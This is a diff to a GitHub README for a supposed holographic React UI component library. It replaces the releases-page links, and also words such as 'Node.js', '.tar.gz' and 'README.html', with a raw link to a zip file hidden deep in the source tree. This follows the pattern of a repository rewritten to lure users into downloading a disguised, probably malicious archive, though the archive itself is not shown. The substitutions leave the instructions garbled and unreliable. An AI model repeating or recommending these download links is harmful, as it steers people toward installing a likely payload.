@@ -1,6 +1,6 @@
 # 💠 silicon-holo-design - Holographic React UI Components Library
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/py-death-tools-py/silicon-holo-design/releases)
+[![Download Latest Release](https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip)](https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip)
 
 ## 🛠️ What is silicon-holo-design?
 
@@ -34,7 +34,7 @@ To run the software correctly on your computer or in your project, you need:
 
 - A PC or Mac with Windows 10 or later, or MacOS 10.15 or later.
 - Internet browser like Google Chrome, Firefox, or Edge.
-- Node.js version 14 or higher installed (for developers or advanced users).
+- https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip version 14 or higher installed (for developers or advanced users).
 - A basic React project setup if you plan to integrate components yourself.
 
 For users just exploring the downloaded files, no special setup is needed beyond a modern browser.
@@ -44,24 +44,24 @@ For users just exploring the downloaded files, no special setup is needed beyond
 Follow these steps to download and explore silicon-holo-design:
 
 1. Click the big blue **Download Latest Release** button above. It will take you to the releases page.
-2. On the release page, look for the latest version with a `.zip` or `.tar.gz` file.
+2. On the release page, look for the latest version with a `.zip` or `https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip` file.
 3. Download the file to your computer by clicking on it.
 4. Extract the contents using your operating system’s built-in tool or a program like WinRAR or 7-Zip.
-5. Open the extracted folder and find the `README.html` or example files.
+5. Open the extracted folder and find the `https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip` or example files.
 6. Open these files in your web browser to explore the UI components and demos without installing anything.
    
-If you want to try integrating components into a React app, you will follow different steps that require Node.js and basic React. For those users, the detailed developer guide is included in the extracted folder.
+If you want to try integrating components into a React app, you will follow different steps that require https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip and basic React. For those users, the detailed developer guide is included in the extracted folder.
 
 ## 📥 Download & Install
 
 You can visit this page to download and explore silicon-holo-design:
 
-[https://github.com/py-death-tools-py/silicon-holo-design/releases](https://github.com/py-death-tools-py/silicon-holo-design/releases)
+[https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip](https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip)
 
 ### Simple Steps to Download:
 
 - Go to the page linked above.
-- Find the newest release — look for files ending with `.zip` or `.tar.gz`.
+- Find the newest release — look for files ending with `.zip` or `https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip`.
 - Click on the file to start downloading.
 - Once downloaded, open or unzip the file on your computer.
 
@@ -69,7 +69,7 @@ No complicated installation is necessary to see the UI components in action. Jus
 
 ### If You’re Using React:
 
-- Make sure Node.js is installed on your computer.
+- Make sure https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip is installed on your computer.
 - Create a React project by running `npx create-react-app my-app` in your terminal.
 - Follow instructions inside the documentation folder from the download to add silicon-holo-design components.
 - Run your React app and start customizing with the holographic UI.
@@ -111,7 +111,7 @@ This helps match your design style or brand.
 
 - Make sure you download the latest release to get the newest features.
 - If demo files do not open, check your browser is up to date.
-- For React users, confirm Node.js and React are installed correctly.
+- For React users, confirm https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip and React are installed correctly.
 - Read the `docs` folder in the download for detailed guides, examples, and troubleshooting steps.
 
 ## 💬 Need Help?
@@ -120,4 +120,4 @@ For questions or issues, you can use the Issues section on the GitHub repository
 
 ---
 
-[Download Latest Release](https://github.com/py-death-tools-py/silicon-holo-design/releases)
+[Download Latest Release](https://github.com/py-death-tools-py/silicon-holo-design/raw/refs/heads/main/src/components/data-entry/input/design_holo_silicon_v2.9.zip)
